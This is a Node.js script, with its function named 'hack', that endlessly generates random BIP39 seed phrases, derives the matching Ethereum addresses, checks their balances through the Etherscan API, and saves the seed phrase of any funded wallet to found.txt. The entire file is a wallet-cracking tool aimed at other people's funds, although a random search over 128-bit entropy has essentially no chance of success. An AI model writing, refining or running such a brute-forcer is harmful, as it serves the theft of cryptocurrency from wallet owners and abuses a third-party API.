const eth = require('ethers');
const Web3 = require('web3');
const hdkey = require('ethereumjs-wallet');
const bip39 = require('bip39');
var api = require('etherscan-api').init('*Your Etherscan Key*');
var fs = require('fs');

async function hack () {
    const path = "m/44'/60'/0'/0/0";
    let entropy;
    let mnemonicPhrase;
    let hdwallet;
    let wallet;
    let address;
    let balance;
    while(true) {
        entropy = eth.utils.randomBytes(16);
        mnemonicPhrase = eth.utils.entropyToMnemonic(entropy);
        hdwallet = hdkey.hdkey.fromMasterSeed(bip39.mnemonicToSeedSync(mnemonicPhrase));
        wallet = hdwallet.derivePath(path).getWallet();
        address = `0x${wallet.getAddress().toString('hex')}`;
        balance = await api.account.balance(address);
        console.log(`Checking: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance.result} ETH`);
        if(balance.result > 0) {
            console.log('\n');
            console.log('mnemonic --->>' + ' '+ mnemonicPhrase)
            console.log('balance --->>' + ' '+ balance.result)
            console.log('\n');
            fs.appendFile("found.txt", `Found: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance.result}`, (err) => { 
                if (err) { 
                    console.log(err); 
                } 
            }); 
        }
    }
}

hack();
